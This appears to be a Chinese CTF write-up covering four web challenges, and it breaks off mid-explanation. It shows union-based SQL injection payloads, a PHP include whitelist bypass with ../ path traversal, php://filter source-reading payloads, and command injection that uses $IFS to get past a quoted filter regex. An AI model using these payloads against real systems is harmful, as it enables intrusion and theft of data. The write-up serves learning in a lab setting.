1.sql注入
-
```
1' order by 2; 两列
```
```
1' union select 1,2;  注入点在第二列
```
![image](https://github.com/xhsy0314/Task/assets/84487619/eb055036-2882-4638-b338-405d6c2e1b38)

```
1' union select 1,group_concat(sql) from sqlite_master;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/50ffb106-0610-46c8-a8e1-0b9ea4db5493)

```
-1' union select 1,group_concat(flaaag) from flaaaaa_aag;
```
![image](https://github.com/xhsy0314/Task/assets/84487619/67694d40-feb4-411a-8b83-9fc80e74ea8a)


2.php
-

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
```

查看源码，有个hint.php访问一下<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/b4e0d62c-591b-4e42-ac93-24fd0e8ad0ac)
<br>
最底部的if语句为执行条件，有三个条件，第一个判断文件不能为空（检查是否传了file参数），第二这个传的参数是字符串，第三要过白名单检测，过了之后包含 隐藏了flag的文件。我们再看上面的if语句，白名单是hint.php，又有mb_strpos和mb_substr截取内容，碰到？就截止，所以我们只需要输入 source.php?file=source.php?即可绕过白名单检测，然后在输入../逐级跳转目录读取flag即可，可以一个一个试,多试几次则找到了flag<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/e62557ea-d228-4f27-a162-0d282f0cb135)
<br>
知识点:

* empty() 函数用于检查一个变量是否为空。
* empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。
* empty() 5.5 版本之后支持表达式了，而不仅仅是变量。

* mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。
注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。

* mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置(即数字)

* .表示当前目录
* . .表示当前目录的上一级目录。
* . ./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定
* ./表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。
* 例如：
        文件夹 a
        下面有 文件夹b c 和文件 d。
        文件夹b下面有e.php 和文件f。
        则e中的 . 表示 文件夹b
        ./f 表示b下面的文件f。
        . .表示a文件夹。
        . ./d 表示a文件夹下的d文件。

3.php伪协议
-


php支持的伪协议：
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

1.php://filter:可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br>

```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```
利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。

而使用的convert.base64-encode，就是一种过滤器。

<br>

**例题**
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/d63f1fcd-2401-48d9-9baf-632075c45976)
<br>

看到这样的格式和题目 include 也很容易想起文件包含和PHP伪协议。
所以，直接用伪协议读取flag.php的源码构造 payload
```
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
```

4.过滤
-

已经通过127.0.0.1;ls 发现了两个文件<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/d621b093-2036-4318-9900-413f12d0d23b)

<br>

```
/?ip=1;cat index.php
```

发现过滤了空格。

```
/?ip=1;cat$IFS$1index.php
```
**知识点**：IFS在系统命令里是空格的意思，它的前后面加$是为了固定这个语句，不然和其他字符串行会出错，后面的$1是空字符，也可以写成${IFS}或${IFS}$9之类的，但{IFS}这个不行，因为{}被过滤了。
输入后获得index.php内容：

```
/?ip=
PING 1 (0.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}
?>
```
其中有四个if判断，
        第一个if中\x为十六进制字符开头
